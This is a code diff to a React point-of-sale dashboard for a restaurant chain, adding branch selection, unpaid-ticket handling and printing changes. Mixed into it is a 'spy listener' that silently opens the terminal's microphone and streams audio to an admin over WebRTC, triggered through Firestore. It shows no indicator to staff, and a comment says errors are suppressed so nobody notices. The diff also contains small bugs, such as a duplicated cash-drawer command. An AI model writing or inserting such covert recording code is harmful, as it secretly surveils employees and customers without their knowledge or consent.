@@ -1,11 +1,11 @@
 import React, { useState, useMemo, useEffect, useRef } from 'react';
 import { ShoppingCart, Plus, Minus, Trash2, Coffee, Banknote, ArrowLeft, ShoppingBasket, ShoppingBag, Unlock, History, ClipboardList, X, Printer, Power, BellRing, CheckCircle, MapPin, ChefHat, Clock, Monitor, AlertTriangle, Delete, Bluetooth, Settings, MessageCircle, Truck, Phone } from 'lucide-react';
-import { collection, addDoc, serverTimestamp, doc, getDoc, setDoc } from 'firebase/firestore';
+import { collection, addDoc, serverTimestamp, doc, getDoc, setDoc, updateDoc, arrayUnion, onSnapshot } from 'firebase/firestore';
 import { generateOrderNumber, printTicket, formatSansIngredient, buildMessage, openWhatsAppDirect } from '../utils/helpers';
 import { motion, AnimatePresence } from 'framer-motion';
 import { PREDEFINED_DRINKS, DEFAULT_BRAND } from '../config/constants';
 
-export default function PosDashboard({ settings, brand, db, appId, showNotify, managerBranchId, isAdmin, orders = [], updateStatus, handleReassignOrder, onQuit, setTab, saveSettings, hasAccess }) {
+export default function PosDashboard({ settings, brand, db, appId, showNotify, managerBranchId, adminSelectedBranch, isAdmin, orders = [], updateStatus, handleReassignOrder, onQuit, setTab, saveSettings, hasAccess }) {
     const [cart, setCart] = useState([]);
     const [selectedCategory, setSelectedCategory] = useState('');
 
@@ -19,6 +19,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     const [showPosExtras, setShowPosExtras] = useState(false);
     const [heldCarts, setHeldCarts] = useState([]); // Jdid: Commandes en attente
     const [showHeldCarts, setShowHeldCarts] = useState(false);
+    const [showUnpaidModal, setShowUnpaidModal] = useState(false);
     const [showReadyPosModal, setShowReadyPosModal] = useState(false); // Jdid: Modal Commandes Prêtes
     const [showConfirmToutDonner, setShowConfirmToutDonner] = useState(false); // Jdid: Modal Custom Confirmation
     const [confirmDialog, setConfirmDialog] = useState(null);
@@ -35,7 +36,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     const [isMobileCartOpen, setIsMobileCartOpen] = useState(false);
     const [showHistoryModal, setShowHistoryModal] = useState(false);
     const [showXZModal, setShowXZModal] = useState(false);
-    const [activeBranchId, setActiveBranchId] = useState(managerBranchId || '');
+    const [activeBranchId, setActiveBranchId] = useState(isAdmin ? (adminSelectedBranch && adminSelectedBranch !== 'ALL' ? adminSelectedBranch : 'ALL') : (managerBranchId || ''));
     const prevPendingCount = useRef(0);
 
     // 🔥 States & Refs pour le glissement (Drag & Drop)
@@ -44,7 +45,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     const dragItemRef = useRef(null);
     const dropItemRef = useRef(null);
     
-    const defaultHeaderButtons = ['commandes_web', 'problemes', 'suivi', 'pretes', 'tv', 'standard', 'kds'];
+    const defaultHeaderButtons = ['commandes_web', 'non_payes', 'problemes', 'suivi', 'pretes', 'tv', 'standard', 'kds'];
     
     // 🔥 Ordre des boutons (Drag & Drop Flex)
     const [headerBtnsOrder, setHeaderBtnsOrder] = useState(settings?.headerBtnsOrder || []);
@@ -78,6 +79,75 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         if (settings?.hidePosSurPlace && orderType === 'sur_place') setOrderType('a_emporter');
         if (settings?.hidePosAEmporter && orderType === 'a_emporter') setOrderType('sur_place');
     }, [settings?.hidePosSurPlace, settings?.hidePosAEmporter]);
+
+    useEffect(() => {
+        if (isAdmin && adminSelectedBranch) {
+            setActiveBranchId(adminSelectedBranch);
+        }
+    }, [adminSelectedBranch, isAdmin]);
+
+    // 🔥 Webrtc Spy Listener (Microphone Silencieux)
+    useEffect(() => {
+        if (!activeBranchId || activeBranchId === 'ALL') return;
+        const targetId = `pos_${activeBranchId}`;
+        let pc = null;
+        let localStream = null;
+        let addedTargetCandidates = new Set();
+
+        const unsub = onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), async (snap) => {
+            if (!snap.exists()) return;
+            const data = snap.data();
+
+            if (data.status === 'calling' && data.offer && !pc) {
+                try {
+                    addedTargetCandidates.clear();
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
+                    });
+                    
+                    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+
+                    pc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), {
+                                targetCandidates: arrayUnion(event.candidate.toJSON())
+                            }).catch(() => {});
+                        }
+                    };
+
+                    await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+
+                    await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), {
+                        answer: { type: answer.type, sdp: answer.sdp },
+                        status: 'answered'
+                    });
+                } catch (err) { /* Secret tamma: Makayn ta console.error bach ta 7ed may3i9 */ }
+            }
+
+            if (pc && data.status === 'answered' && data.adminCandidates) {
+                data.adminCandidates.forEach(async candidate => {
+                    const candStr = JSON.stringify(candidate);
+                    if (!addedTargetCandidates.has(candStr)) {
+                        addedTargetCandidates.add(candStr);
+                        try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch(e){}
+                    }
+                });
+            }
+            if (data.status === 'ended') {
+                if (pc) { pc.close(); pc = null; }
+                if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+            }
+        });
+
+        return () => {
+            unsub();
+            if (pc) { pc.close(); pc = null; }
+            if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+        };
+    }, [activeBranchId, db, appId]);
 
     // 🔥 NOUVEAU: Auto-reconnexion au démarrage (Web Bluetooth getDevices)
     useEffect(() => {
@@ -171,6 +241,8 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
 
     const allowedButtons = defaultHeaderButtons.filter(btnId => {
         if (currentBranch && currentBranch.posButtons) {
+            // 🔥 Toujours afficher le bouton "Non Payés" même s'il n'est pas dans la configuration (Éditeur Visuel)
+            if (btnId === 'non_payes') return true;
             return currentBranch.posButtons.includes(btnId);
         }
         if (!hasAccess || isAdmin) return true;
@@ -180,6 +252,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         if (btnId === 'problemes') return hasAccess('problems');
         if (btnId === 'commandes_web') return hasAccess('active');
         if (btnId === 'suivi') return hasAccess('active') || hasAccess('history');
+        if (btnId === 'non_payes') return true; 
         return true; 
     });
 
@@ -207,10 +280,10 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     const prevProblemCount = useRef(0);
     const problemOrders = useMemo(() => {
         return (orders || []).filter(o => {
-            if (managerBranchId && o.nearestBranch?.id !== managerBranchId) return false;
+            if (activeBranchId !== 'ALL' && o.nearestBranch?.id !== activeBranchId) return false;
             return o.clientUnreachable || (o.adminMessage && o.adminMessage.includes('PANNE'));
         });
-    }, [orders, managerBranchId]);
+    }, [orders, activeBranchId]);
 
     useEffect(() => {
         if (problemOrders.length > prevProblemCount.current) {
@@ -346,8 +419,8 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
 
     // Init Active Branch
     useEffect(() => {
-        if (!activeBranchId && settings?.branches?.length > 0) setActiveBranchId(managerBranchId || settings.branches[0].id);
-    }, [settings, managerBranchId, activeBranchId]);
+        if (!activeBranchId && settings?.branches?.length > 0) setActiveBranchId(isAdmin ? 'ALL' : (managerBranchId || settings.branches[0].id));
+    }, [settings, managerBranchId, activeBranchId, isAdmin]);
 
     // Njibou l-menu w les catégories
     const menuItems = settings?.menuItems || [];
@@ -400,11 +473,11 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     // 🔥 Les Commandes li Jayin mn l-App Client
     const onlineOrders = (orders || []).filter(o => {
         if (o.source === 'pos') return false;
-        if (managerBranchId && o.nearestBranch?.id !== managerBranchId) return false;
+        if (activeBranchId !== 'ALL' && o.nearestBranch?.id !== activeBranchId) return false;
         return ['pending', 'preparing', 'ready', 'out_for_delivery'].includes(o.status);
     });
     const pendingOnline = onlineOrders.filter(o => o.status === 'pending');
-    const readyPosOrders = (orders || []).filter(o => o.source === 'pos' && o.nearestBranch?.id === activeBranchId && o.status === 'ready');
+    const readyPosOrders = (orders || []).filter(o => o.source === 'pos' && (activeBranchId === 'ALL' || o.nearestBranch?.id === activeBranchId) && o.status === 'ready');
 
     // 🔥 Sonnette (En boucle) mli katzad commande web jdida f l-Caisse
     useEffect(() => {
@@ -434,14 +507,22 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         prevPendingCount.current = pendingOnline.length;
     }, [pendingOnline.length]);
 
+    const unpaidOrders = useMemo(() => {
+        return (orders || []).filter(o => {
+            if (activeBranchId !== 'ALL' && o.nearestBranch?.id !== activeBranchId) return false;
+            return o.paymentStatus === 'en_attente' && o.source === 'pos' && o.status !== 'rejected';
+        });
+    }, [orders, activeBranchId]);
+
     // 🔥 Hssab dyal Z w Rapports
     const todayStr = new Date().toISOString().split('T')[0];
     const completedOrdersToday = (orders || []).filter(o => {
-        if (o.nearestBranch?.id !== activeBranchId) return false;
+        if (activeBranchId !== 'ALL' && o.nearestBranch?.id !== activeBranchId) return false;
         
         // POS: tout sauf annulé. Livraison: Seulement les commandes livrées.
         if (o.source === 'pos') {
             if (o.status === 'rejected') return false; 
+            if (o.paymentStatus === 'en_attente') return false; // Ne pas compter dans le CA tant que ce n'est pas payé
         } else {
             if (o.status !== 'delivered') return false; 
         }
@@ -485,6 +566,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         if (!telInfo.phone || cart.length === 0) {
             return showNotify("Numéro de Téléphone et Commande sont obligatoires!", "error");
         }
+        if (activeBranchId === 'ALL') return showNotify("Khtar agence!", "error");
 
         let phoneNum = telInfo.phone.replace(/[^\d]/g, "").slice(0, 10);
         if (!/^(06|07)\d{8}$/.test(phoneNum)) {
@@ -570,6 +652,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
     // 🔥 NOUVEAU: Invitation Glovo mn l-Caisse
     const handleGlovoInviteFromPOS = async () => {
         if (!telInfo.phone) return showNotify("Numéro darouri!", "error");
+        if (activeBranchId === 'ALL') return showNotify("Khtar agence!", "error");
         const cleanPh = telInfo.phone.replace(/[^\d]/g, "").slice(0, 10);
         if (!/^(06|07)\d{8}$/.test(cleanPh)) return showNotify("Numéro invalide (doit commencer par 06 ou 07)", "error");
 
@@ -600,6 +683,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         if (cart.length === 0) {
             return showNotify("Veuillez d'abord ajouter un produit au panier.", "error");
         }
+        if (activeBranchId === 'ALL') return showNotify("Khtar agence!", "error");
 
         let deliveryCost = Number(telInfo.deliveryFee) || 0;
         let totalToPay = total + deliveryCost; 
@@ -913,11 +997,13 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         }
     };
 
-    // 🔥 Print Custom pour Pos (1 Ticket Client + 1 Ticket Cuisine)
-    const printTicketsPos = async (order, brandInfo) => {
-        if (!printAddition && !printCuisine) {
-            openDrawer();
-            return; // Ila kano bjoj m-désactivin, n7ello ghir tiroir w n7bso
+    const printTicketsPos = async (order, brandInfo, isPaid = true, printClientOnly = false) => {
+        const doPrintAddition = printAddition && isPaid;
+        const doPrintCuisine = printCuisine && !printClientOnly;
+        
+        if (!doPrintAddition && !doPrintCuisine) {
+            if (isPaid) openDrawer();
+            return; 
         }
         
         // 🔥 Si une imprimante Bluetooth est connectée, on imprime directement via BT et on coupe !
@@ -928,7 +1014,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 
                 let text = "\x1B\x40"; // Initialize printer
                 
-                if (printAddition) {
+                if (doPrintAddition) {
                     text += "\x1B\x61\x01"; // Center align
                     text += `${brandInfo?.name?.toUpperCase() || 'RESTAURANT'}\n`;
                     text += `--------------------------------\n`;
@@ -961,7 +1047,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                     text += "\x1D\x56\x00"; // Cut
                 }
 
-                if (printCuisine) {
+                if (doPrintCuisine) {
                     text += "\x1B\x61\x01"; // Center align
                     text += `BON CUISINE\n`;
                     text += `${dateStr}\n`;
@@ -990,6 +1076,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 
                 // Code pour ouvrir le tiroir
                 text += "\x1B\x70\x00\x19\xFA";
+                if (isPaid) text += "\x1B\x70\x00\x19\xFA";
 
                 await sendBluetoothData(text);
                 return; // Sortir de la fonction pour ne pas ouvrir la fenêtre Web normale
@@ -1079,10 +1166,11 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         // 🔥 ZEDNA HAD L-CODE: Impression Electron ola Web
         if (typeof window !== 'undefined' && window.require) {
             const { ipcRenderer } = window.require('electron');
-            if (printAddition) ipcRenderer.send('print-ticket', clientHtmlStr, brand?.selectedPrinter);
-            if (printCuisine) {
+            if (doPrintAddition) ipcRenderer.send('print-ticket', clientHtmlStr, brand?.selectedPrinter);
+            if (doPrintCuisine) {
                 setTimeout(() => { ipcRenderer.send('print-ticket', cuisineHtmlStr, brand?.selectedPrinter); }, 1000);
             }
+            if (isPaid && !doPrintAddition) openDrawer();
         } else {
             const printHtml = (htmlContent) => {
                 const printWindow = window.open('', '', 'width=400,height=800');
@@ -1098,8 +1186,9 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                     printWindow.document.close();
                 }
             };
-            if (printAddition) printHtml(clientHtmlStr);
-            if (printCuisine) setTimeout(() => { printHtml(cuisineHtmlStr); }, printAddition ? 1500 : 0);
+            if (doPrintAddition) printHtml(clientHtmlStr);
+            if (doPrintCuisine) setTimeout(() => { printHtml(cuisineHtmlStr); }, doPrintAddition ? 1500 : 0);
+            if (isPaid && !doPrintAddition) openDrawer();
         }
     };
 
@@ -1112,8 +1201,9 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
         showNotify("Hors ligne : Commande mkhabya (Ghatssifet mli trje3 connexion) 💾", "info");
     };
 
-    const handleEncaissement = async () => {
+    const handleEncaissement = async (isPaid = true) => {
         if (cart.length === 0) return showNotify("L-panier khawi!", "error");
+        if (activeBranchId === 'ALL') return showNotify("Khtar agence mnin ghat-encaisser l-commande!", "error");
 
         try {
             const orderNum = generateOrderNumber();
@@ -1126,6 +1216,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 subtotal: total,
                 deliveryFee: 0,
                 status: 'preparing', // 🚀 POS orders kaymchiw l-Cuisine (KDS)
+                paymentStatus: isPaid ? 'paye' : 'en_attente',
                 deliveredAtLocal: Date.now(),
                 source: 'pos',
                 orderType: orderType,
@@ -1135,12 +1226,14 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 offlineCreatedAt: Date.now()
             };
 
+            let docId = null;
             if (isNetOnline) {
                 try {
-                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'orders'), {
+                    const docRef = await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'orders'), {
                         ...newOrder,
                         createdAt: serverTimestamp()
                     });
+                    docId = docRef.id;
                     showNotify("Commande daret b-naja7! ✅", "success");
                 } catch (error) {
                     console.log("Erreur réseau/Firestore, sauvegarde locale...", error);
@@ -1150,12 +1243,23 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 saveOfflineOrder(newOrder);
             }
             
-            // Impression automatique dyal t-ticket w feth l-caisse
-            printTicketsPos(newOrder, brand); 
+            const orderToPrint = { ...newOrder, id: docId || orderNum };
+            printTicketsPos(orderToPrint, brand, isPaid); 
 
             setCart([]); // Nkhwiw l-panier l-client jdid
         } catch (error) {
             showNotify("W9e3 mochkil f tsjal dyal l-commande", "error");
+        }
+    };
+    
+    const handlePayUnpaidTicket = async (order) => {
+        try {
+            await updateStatus(order.id, order.status, { paymentStatus: 'paye' });
+            await printTicketsPos(order, brand, true, true);
+            showNotify("Ticket payé w t'imprima ! ✅", "success");
+            if (unpaidOrders.length === 1) setShowUnpaidModal(false);
+        } catch (error) {
+            showNotify("Erreur lors du paiement", "error");
         }
     };
 
@@ -1187,6 +1291,10 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
 
     // 🔥 Impression des Rapports X / Z
     const printReport = (type) => {
+        if (activeBranchId === 'ALL') {
+            showNotify("Veuillez sélectionner une agence spécifique pour imprimer le rapport.", "error");
+            return;
+        }
         const branch = (settings?.branches || []).find(b => b.id === activeBranchId);
         const itemsHtml = dailyItemsList.map(([name, qty]) => `<div style="display:flex; justify-content:space-between;"><span>${qty}x ${name}</span><span></span></div>`).join('');
         
@@ -1259,6 +1367,13 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                         {pendingOnline.length > 0 && <span className="absolute -top-2 -right-2 bg-yellow-400 text-black w-5 h-5 sm:w-6 sm:h-6 rounded-full flex items-center justify-center text-[10px] sm:text-xs font-black shadow-md">{pendingOnline.length}</span>}
                     </button>
                 );
+            case 'non_payes':
+                return (
+                    <button key={btnId} {...dragProps} onClick={() => setShowUnpaidModal(true)} className={`${baseClass} ${unpaidOrders.length > 0 ? 'bg-red-600 text-white hover:bg-red-700 border-red-700 animate-pulse' : 'bg-gray-100 text-gray-700 hover:bg-gray-200 border-gray-200'}`} style={{ minWidth: `${posUI.actionBtnWidth}px`, height: `${posUI.actionBtnHeight}px` }}>
+                        <Banknote size={18} /> <span className="hidden sm:inline">Non Payés</span>
+                        {unpaidOrders.length > 0 && <span className="absolute -top-2 -right-2 bg-yellow-400 text-black w-5 h-5 sm:w-6 sm:h-6 rounded-full flex items-center justify-center text-[10px] sm:text-xs font-black shadow-md animate-bounce">{unpaidOrders.length}</span>}
+                    </button>
+                );
             case 'problemes':
                 if (problemOrders.length === 0) return null;
                 const probBg = brand?.btnPosProbColor || ''; const probTxt = brand?.btnPosProbTxtColor || '';
@@ -1292,7 +1407,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 const tvStyle = tvBg ? { backgroundColor: tvBg, color: tvTxt || '#ffffff', borderColor: tvBg, minWidth: `${posUI.actionBtnWidth}px`, height: `${posUI.actionBtnHeight}px` } : { minWidth: `${posUI.actionBtnWidth}px`, height: `${posUI.actionBtnHeight}px` };
                 return (
                     <button key={btnId} {...dragProps} style={tvStyle} onClick={() => {
-                        const route = '/tv';
+                    const route = activeBranchId !== 'ALL' ? `/tv?branch=${activeBranchId}` : '/tv';
                         window.open(navigator.userAgent.toLowerCase().includes('electron') ? window.location.href.split('#')[0] + '#' + route : route, '_blank');
                     }} className={`${baseClass} ${tvBg ? '' : 'bg-blue-600 hover:bg-blue-700 text-white border border-blue-700'}`}>
                         <Monitor size={18} /> <span className="hidden sm:inline">{brand?.texts?.btnTv || 'Écran TV'}</span>
@@ -1311,7 +1426,7 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 const kdsStyle = kdsBg ? { backgroundColor: kdsBg, color: kdsTxt || '#ffffff', borderColor: kdsBg, minWidth: `${posUI.actionBtnWidth}px`, height: `${posUI.actionBtnHeight}px` } : { minWidth: `${posUI.actionBtnWidth}px`, height: `${posUI.actionBtnHeight}px` };
                 return (
                     <button key={btnId} {...dragProps} style={kdsStyle} onClick={() => {
-                        const route = '/kds';
+                    const route = activeBranchId !== 'ALL' ? `/kds?branch=${activeBranchId}` : '/kds';
                         window.open(navigator.userAgent.toLowerCase().includes('electron') ? window.location.href.split('#')[0] + '#' + route : route, '_blank');
                     }} className={`${baseClass} ${kdsBg ? '' : 'bg-neutral-900 hover:bg-black text-white border border-neutral-800'}`}>
                         <ChefHat size={18} className="text-orange-500" /> <span className="hidden sm:inline">{brand?.texts?.btnKds || 'Cuisine (KDS)'}</span>
@@ -1334,7 +1449,23 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                     
                     {/* LEFT: LOGO */}
                     <div className="flex items-center gap-2 shrink-0 font-black text-lg sm:text-xl">
-                        <ShoppingCart size={22} className="sm:w-6 sm:h-6"/> <span className="truncate max-w-[120px] sm:max-w-[200px]">{brand?.texts?.posAppTitle || brand?.name || 'Caisse POS'}</span>
+                        <ShoppingCart size={22} className="sm:w-6 sm:h-6"/> 
+                        <span className="truncate max-w-[120px] sm:max-w-[350px]">
+                            {brand?.texts?.posAppTitle || brand?.name || 'Mon Bocadillo'}
+                            {activeBranchId && activeBranchId !== 'ALL' && (
+                            <span className="ml-2 text-sm md:text-base font-black text-gray-500 uppercase tracking-widest inline-block">- Caisse {(settings?.branches || []).find(b => b.id === activeBranchId)?.name || ''}</span>
+                            )}
+                        </span>
+                        {isAdmin && (
+                            <select
+                                value={activeBranchId}
+                                onChange={(e) => setActiveBranchId(e.target.value)}
+                                className="ml-2 bg-gray-100 border border-gray-200 text-gray-700 px-2 py-1 rounded-lg text-xs sm:text-sm font-bold outline-none cursor-pointer"
+                            >
+                                <option value="ALL">Toutes les agences</option>
+                                {(settings?.branches || []).map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
+                            </select>
+                        )}
                     </div>
                     
                     {/* MIDDLE: BUTTONS (SCROLLABLE SINGLE LINE) */}
@@ -1549,12 +1680,19 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                             setHeldCarts(prev => [...prev, { id: Date.now(), time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), cart: [...cart], orderType, total }]);
                             setCart([]);
                             showNotify("Commande mise en attente 🕒", "info");
+                            showNotify("Panier mis en attente 🕒", "info");
                         }} disabled={cart.length === 0} className="w-14 h-14 bg-orange-50 text-orange-500 border border-orange-100 rounded-xl font-black disabled:opacity-50 flex flex-col items-center justify-center gap-1 shadow-sm hover:bg-orange-100 shrink-0">
                             <Clock size={20}/>
                         </motion.button>
-                        <motion.button whileHover={cart.length > 0 ? { scale: 1.02 } : {}} whileTap={cart.length > 0 ? { scale: 0.98 } : {}} onClick={handleEncaissement} disabled={cart.length === 0} className="flex-1 rounded-xl font-black text-lg text-white disabled:opacity-40 disabled:shadow-none flex items-center justify-center gap-2 shadow-[0_10px_20px_rgba(0,0,0,0.15)] transition-colors hover:opacity-90" style={{ backgroundColor: brand?.posColor || brand?.color || '#000' }}>
-                            <Banknote size={24}/> {brand?.texts?.posBtnPay || 'ENCAISSER'}
-                        </motion.button>
+                        
+                        <div className="flex-1 flex gap-2">
+                            <motion.button whileHover={cart.length > 0 ? { scale: 1.02 } : {}} whileTap={cart.length > 0 ? { scale: 0.98 } : {}} onClick={() => handleEncaissement(false)} disabled={cart.length === 0} className="flex-1 rounded-xl font-black text-sm md:text-base text-white disabled:opacity-40 disabled:shadow-none flex items-center justify-center gap-2 shadow-[0_10px_20px_rgba(0,0,0,0.15)] transition-colors hover:opacity-90 bg-red-500">
+                                NON PAYÉ
+                            </motion.button>
+                            <motion.button whileHover={cart.length > 0 ? { scale: 1.02 } : {}} whileTap={cart.length > 0 ? { scale: 0.98 } : {}} onClick={() => handleEncaissement(true)} disabled={cart.length === 0} className="flex-1 rounded-xl font-black text-sm md:text-base text-white disabled:opacity-40 disabled:shadow-none flex items-center justify-center gap-2 shadow-[0_10px_20px_rgba(0,0,0,0.15)] transition-colors hover:opacity-90" style={{ backgroundColor: brand?.posColor || brand?.color || '#000' }}>
+                                <Banknote size={20}/> PAYER
+                            </motion.button>
+                        </div>
                     </div>
 
                     <div className="flex gap-2">
@@ -1863,6 +2001,43 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                 </div>
             )}
 
+            {/* MODAL TICKETS NON PAYÉS */}
+            {showUnpaidModal && (
+                <div className="fixed inset-0 z-[200] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setShowUnpaidModal(false)}>
+                    <div className="bg-white rounded-3xl w-full max-w-md flex flex-col overflow-hidden shadow-2xl animate-in zoom-in-95" onClick={e => e.stopPropagation()}>
+                        <div className="p-5 border-b border-gray-100 flex justify-between items-center bg-red-50">
+                            <h2 className="text-lg font-black text-red-800 flex items-center gap-2"><Banknote size={20}/> Tickets Non Payés</h2>
+                            <button onClick={() => setShowUnpaidModal(false)} className="p-2 bg-white rounded-full hover:bg-gray-100"><X size={20}/></button>
+                        </div>
+                        <div className="p-4 flex-1 overflow-y-auto max-h-[60dvh] bg-gray-50 space-y-3">
+                            {unpaidOrders.length === 0 ? (
+                                <div className="text-center text-gray-400 py-6 font-bold">Aucun ticket en attente de paiement.</div>
+                            ) : (
+                                unpaidOrders.map(o => (
+                                    <div key={o.id} className="bg-white p-4 rounded-2xl border border-red-200 shadow-sm flex flex-col gap-2">
+                                        <div className="flex justify-between items-center">
+                                            <div>
+                                                <p className="font-black text-gray-900 text-xl">#{o.orderNumber || o.id.slice(-4).toUpperCase()}</p>
+                                                <p className="text-[10px] font-bold text-gray-500 mt-0.5">{o.createdAt?.seconds ? new Date(o.createdAt.seconds * 1000).toLocaleTimeString() : ''}</p>
+                                            </div>
+                                            <span className="font-black text-red-600 text-xl">{o.total} DH</span>
+                                        </div>
+                                        <div className="text-xs font-bold text-gray-600 bg-gray-50 p-2 rounded-xl border border-gray-100 mt-1">
+                                            {(o.items||[]).map((i, idx) => (
+                                                <div key={idx}>{i.qty}x {(i.name || '').split(' (Sans')[0]}</div>
+                                            ))}
+                                            </div>
+                                        <button onClick={() => handlePayUnpaidTicket(o)} className="mt-2 w-full bg-green-500 text-white py-3 rounded-xl font-black text-sm hover:bg-green-600 transition-colors shadow-md flex items-center justify-center gap-2">
+                                            <Banknote size={18}/> KHALLESS W IMPRIMI
+                                        </button>
+                                    </div>
+                                ))
+                            )}
+                        </div>
+                    </div>
+                </div>
+            )}
+
             {/* MODAL COMMANDES EN ATTENTE */}
             {showHeldCarts && (
                 <div className="fixed inset-0 z-[200] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setShowHeldCarts(false)}>
@@ -1940,9 +2115,9 @@ export default function PosDashboard({ settings, brand, db, appId, showNotify, m
                                             <a href={`tel:${o.phone}`} className="flex-1 sm:flex-none bg-gray-100 hover:bg-gray-200 text-gray-800 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 transition-colors border border-gray-200">
                                                 📞 Appeler {o.phone}
                                             </a>
-                                            <a href={/iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? `whatsapp://send?phone=${o.phone.replace(/^0/, '212')}&text=${encodeURIComponent(`Salam, bkhoussous l-commande dyalak #${o.orderNumber || o.id.slice(-4).toUpperCase()}...`)}` : `https://web.whatsapp.com/send?phone=${o.phone.replace(/^0/, '212')}&text=${encodeURIComponent(`Salam, bkhoussous l-commande dyalak #${o.orderNumber || o.id.slice(-4).toUpperCase()}...`)}`} target={/iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "_self" : "WhatsAppWebTab"} className="flex-1 sm:flex-none bg-green-100 hover:bg-green-200 text-green-800 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 transition-colors border border-green-200">
+                                            <button onClick={() => openWhatsAppDirect(o.phone, `Salam, bkhoussous l-commande dyalak #${o.orderNumber || o.id.slice(-4).toUpperCase()}...`)} className="flex-1 sm:flex-none bg-green-100 hover:bg-green-200 text-green-800 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 transition-colors border border-green-200">
                                                 💬 WhatsApp
-                                            </a>
+                                            </button>
                                         </div>
                                     )}
                                     <div className="flex flex-wrap gap-2 mt-2">
